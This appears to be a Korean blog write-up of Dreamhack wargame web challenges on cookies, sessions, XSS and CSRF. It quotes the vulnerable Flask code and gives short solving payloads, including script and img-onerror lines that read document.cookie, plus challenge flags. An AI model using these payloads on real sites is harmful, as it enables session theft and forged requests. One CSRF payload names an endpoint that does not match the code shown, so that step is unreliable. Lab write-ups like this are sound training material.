---
title: Dreamhack Wargame Write Up ( Update 2022.2.19 )
date: 2022-02-19
tags: Dreamhack
categories: Dreamhack
---

## Cookie
```python
@app.route('/') # / 페이지 라우팅 
def index():
    username = request.cookies.get('username', None) # 이용자가 전송한 쿠키의 username 입력값을 가져옴
    if username: # username 입력값이 존재하는 경우
        return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}') # "admin"인 경우 FLAG 출력, 아닌 경우 "you are not admin" 출력
    return render_template('index.html')
```

해당 페이지에서 요청에 포함된 쿠키를 통해 이용자를 식별하는 것을 확인할 수 있습니다
따라서 쿠키에 존재하는 username 이 admin 인 경우 flag 를 출력하는 것을 확인할 수 있습니다

```python
@app.route('/login', methods=['GET', 'POST']) # login 페이지 라우팅, GET/POST 메소드로 접근 가능
def login():
    if request.method == 'GET': # GET 메소드로 요청 시
        return render_template('login.html') # login.html 페이지 출력
    elif request.method == 'POST': # POST 메소드로 요청 시
        username = request.form.get('username') # 이용자가 전송한 username 입력값을 가져옴
        password = request.form.get('password') # 이용자가 전송한 password 입력값을 가져옴
        try:
            pw = users[username] # users 변수에서 이용자가 전송한 username이 존재하는지 확인
        except: 
            return '<script>alert("not found user");history.go(-1);</script>' # 존재하지 않는 username인 경우 경고 출력
        if pw == password: # password 체크
            resp = make_response(redirect(url_for('index')) ) # index 페이지로 이동하는 응답 생성
            resp.set_cookie('username', username) # username 쿠키 설정
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>' # password가 동일하지 않은 경우
```

```python
try:
    FLAG = open('./flag.txt', 'r').read() # flag.txt 파일로부터 FLAG 데이터를 가져옴.
except:
    FLAG = '[**FLAG**]'
users = {
    'guest': 'guest',
    'admin': FLAG # FLAG 데이터를 패스워드로 선언
}
```

GET 방식일때 username 과 password 를 입력할 수 있는 페이지를 제공하는 것을 확인할 수 있습니다
POST 에서는 이용자가 입력한 username 과 password 입력 값을 users 변숫값과 비교합니다
손님 계정의 비밀번호는 guest 관리자 계정의 비밀번호는 flag 임을 확인할 수 있습니다

<img width="1296" alt="스크린샷 2022-02-16 오후 5 23 57" src="https://user-images.githubusercontent.com/94741698/154224618-36d18731-94d1-4f55-970f-46f74f376ce7.png">

username 을 admin 으로 변경해 문제를 풀 수 있습니다

> Flag : DH{7952074b69ee388ab45432737f9b0c56}

## Session - Basic
```python
@app.route('/admin')
def admin():
    return session_storage
```

이 문제는 Cookie 문제와 비슷하지만 /admin 페이지를 가면 admin 계정의 세션 아이디를 알려줍니다
따라서 guest 로 로그인해 준 후 cookie 값과 session id 를 변경해 주면 문제가 풀립니다

> Flag : DH{8f3d86d1134c26fedf7c4c3ecd563aae3da98d5c}

## XSS - 1
```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
```

해당 페이지에서는 이용자가 전달한 XSS 파라미터의 값을 출력하는 것을 확인할 수 있습니다

```python
@app.route('/memo') # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수로 참조
    text = request.args.get('memo', '') # 사용가 전송한 memo 입력값을 가져옴
    memo_text += text + '\n' # 사용가 전송한 memo 입력값을 memo_text에 추가
    return render_template('memo.html', memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력
```

해당 페이지에서는 이용자가 전달한 memo 파라미터 값을 render_template 함수를 통해 기록하고 출력하는 것을 확인할 수 있습니다

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True
    
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
    
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```

GET 방식일 때 이용자에게 URL 을 입력받는 페이지를 제공하는 것을 확인할 수 있습니다
POST 는 params 파라미터 값과 쿠키에 FLAG 를 포함해 check_xss 함수를 호출합니다
check_xss 는 read_url 에 url 과 cookie 를 설정하고 반환해주고 vuln 엔드 포인트에 접속합니다

add_cookie(cookie) 를 통해 쿠키를 추가하고 get(url) 을 통해 접근하는데 이 때 memo 를 사용하여
log 를 남기게 하여 문제를 풀 수 있습니다

vuln 과 memo 엔드 포인트는 이용자의 입력값을 페이지에 출력합니다
memo 는 reder_template 함수를 사용해 memo.html 을 출력합니다

render_template 함수는 전달된 템플릿 변수를 기록할 때 HTML 엔티티코드로 변환해 저장하기 때문에 XSS 가 발생하지 않습니다

그러나 vuln 은 이용자가 입력한 값을 페이지에 그대로 출력하기 때문에 XSS 가 발생합니다

문제를 해결하기 위해서는 /vuln 엔드 포인트에서 발생하는 취약점을 통해 임의 이용자의 쿠키를 탈취해야 합니다

탈취한 쿠키를 전달받기 위해서는 외부에서 접근 가능한 서버를 사용하거나 문제에서 제공하는 memo 엔드 포인트를 사용할 수 있습니다

- location.href : 전체 URL 을 반환하거나 URL 을 업데이트 할 수 있는 속성입니다
- document.cookie : 해당 페이지에서 사용하는 쿠키를 읽고 쓰는 속성값입니다

flag 엔드 포인트에서 다음과 같은 코드를 입력하면 memo 엔드 포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있습니다

```python
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

> Flag : DH{3c01577e9542ec24d68ba0ffb846508f}

## XSS - 2
```python
<img src=x onerror="location.href='/memo?memo=' + document.cookie">
```

이 문제는 `<script>` 를 필터링하기 때문에 다른 태그를 사용해야 합니다

> Flag : DH{3c01577e9542ec24d68ba0ffb846508f}

## CSRF - 1
```python
@app.route("/vuln") # vuln 페이지 라우팅 (이용자가 /vuln 페이지에 접근시 아래 코드 실행)
def vuln():
    param = request.args.get("param", "").lower()   # 이용자가 입력한 param 파라미터를 소문자로 변경
    xss_filter = ["frame", "script", "on"]  # 세 가지 필터링 키워드
    for _ in xss_filter:
        param = param.replace(_, "*")   # 이용자가 입력한 값 중에 필터링 키워드가 있는 경우, '*'로 치환
    return param    # 이용자의 입력 값을 화면 상에 표시
```

해당 페이지에서는 XSS 공격을 못하도록 frame , script , on 을 필터링 하고 있는 것을 확인할 수 있습니다

```python
@app.route('/memo') # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수로 참조
    text = request.args.get('memo', '') # 이용자가 전송한 memo 입력값을 가져옴
    memo_text += text + '\n' # 메모의 마지막에 새 줄 삽입 후 메모에 기록
    return render_template('memo.html', memo=memo_text) # 사이트에 기록된 메모를 화면에 출력
```

해당 페이지에서는 이용자가 전달한 memo 파라미터 값을 render_template 함수를 통해 기록하고 출력하는 것을 확인할 수 있습니다

```python
@app.route('/admin/notice_flag') # notice_flag 페이지 라우팅
def admin_notice_flag():
    global memo_text # 메모를 전역변수로 참조
    if request.remote_addr != '127.0.0.1': # 이용자의 IP가 로컬호스트가 아닌 경우
        return 'Access Denied' # 접근 제한
    if request.args.get('userid', '') != 'admin': # userid 파라미터가 admin이 아닌 경우
        return 'Access Denied 2' # 접근 제한
    memo_text += f'[Notice] flag is {FLAG}\n' # 위의 조건을 만족한 경우 메모에 FLAG 기록
    return 'Ok' # Ok 반환
```

해당 페이지에서는 로컬 호스트에서 접근하고 , userid 파라미터가 admin 일 경우 메모에 FLAG 를 작성하고 , 조건을 만족하지 못하면 접근 제한 메시지가 출력됩니다
/admin/notice_flag 페이지 자체는 모두가 접근할 수 있고 , userid 파라미터에 admin 값을 넣을 수 있습니다

따라서 로컬 호스트에서 접근하여 userid 에 admin 을 입력해주고 접근한 memo_text 값을 확인하면 flag 를 얻을 수 있습니다

```python
@app.route("/flag", methods=["GET", "POST"])    # flag 페이지 라우팅 (GET, POST 요청을 모두 받음)
def flag():
    if request.method == "GET": # 이용자의 요청이 GET 메소드인 경우
        return render_template("flag.html") # 이용자에게 링크를 입력받는 화면을 출력
    elif request.method == "POST":  # 이용자의 요청이 POST 메소드인 경우
        param = request.form.get("param", "")   # param 파라미터를 가져온 후,
        if not check_csrf(param):   # 관리자에게 접속 요청 (check_csrf 함수)
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"  # 로컬 URL 설정
    return read_url(url, cookie)  # URL 방문
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})  # 관리자 쿠키가 적용되는 범위를 127.0.0.1로 제한되도록 설정
    try:
        options = webdriver.ChromeOptions() # 크롬 옵션을 사용하도록 설정
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_) # 크롬 브라우저 옵션 설정
        driver = webdriver.Chrome("/chromedriver", options=options) # 셀레늄에서 크롬 브라우저 사용
        driver.implicitly_wait(3)   # 크롬 로딩타임을 위한 타임아웃 3초 설정
        driver.set_page_load_timeout(3) # 페이지가 오픈되는 타임아웃 시간 3초 설정
        driver.get("http://127.0.0.1:8000/")    # 관리자가 CSRF-1 문제 사이트 접속
        driver.add_cookie(cookie)   # 관리자 쿠키 적용
        driver.get(url) # 인자로 전달된 url에 접속
    except Exception as e:
        driver.quit()   # 셀레늄 종료
        print(str(e))
        # return str(e)
        return False    # 접속 중 오류가 발생하면 비정상 종료 처리
    driver.quit()   # 셀레늄 종료
    return True # 정상 종료 처리
```

GET 방식일 때 이용자에게 URL 을 입력받는 페이지를 제공하는 것을 확인할 수 있습니다
POST 는 param 파라미터 값을 가져와 check_csrf 함수를 통해 vuln 페이지로 넘어갑니다

read_url 함수를 통해 쿠키가 로컬로 설정되어 서버에서 해당 요청을 수행하게 됩니다

이 때 방문하는 URL 은 서버가 동작하고 있는 로컬 호스트의 이용자가 방문하는 시나리오이기 때문에 127.0.0.1 의 호스트로 접속하게 됩니다

flag 엔드 포인트에서 다음과 같은 코드를 입력하면 문제를 풀 수 있습니다

```html
<img src="/admin/notice_flag?userid=admin" />
```

> Flag : DH{11a230801ad0b80d52b996cbe203e83d}

## CSRF - 2
```python
@app.route("/change_password")
def change_password():
    pw = request.args.get("pw", "")
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    users[username] = pw
    return 'Done'
```

이 문제는 CSRF - 1 문제와 다르게 change_password 페이지가 존재하는 것을 확인할 수 있습니다
이 페이지는 pw 파라미터로 비밀번호를 바꿀 수 있습니다

초기 비밀번호는 FLAG 이지만 pw 를 변경해주므로 문제를 풀 수 있습니다

```html
<img src="/check_password?pw=admin">
```

> Flag : DH{c57d0dc12bb9ff023faf9a0e2b49e470a77271ef}

